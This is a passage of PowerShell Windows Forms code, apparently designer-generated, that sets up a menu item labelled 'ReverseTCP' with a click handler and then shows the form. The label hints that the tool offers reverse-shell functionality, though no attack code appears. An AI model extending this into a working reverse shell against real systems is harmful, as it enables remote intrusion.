	$reverseTCPToolStripMenuItem.Size = '134, 22'
	$reverseTCPToolStripMenuItem.Text = 'ReverseTCP'
	$reverseTCPToolStripMenuItem.add_Click($reverseTCPToolStripMenuItem_Click)
	$menustrip1.ResumeLayout()
	$tabpage1.ResumeLayout()
	$tabcontrol1.ResumeLayout()
	$Form1.ResumeLayout()
	#endregion Generated Form Code

	#----------------------------------------------

	#Save the initial state of the form
	$InitialFormWindowState = $Form1.WindowState
	#Init the OnLoad event to correct the initial state of the form
	$Form1.add_Load($Form_StateCorrection_Load)
	#Clean up the control events
	$Form1.add_FormClosed($Form_Cleanup_FormClosed)
	#Show the Form
	return $Form1.ShowDialog()
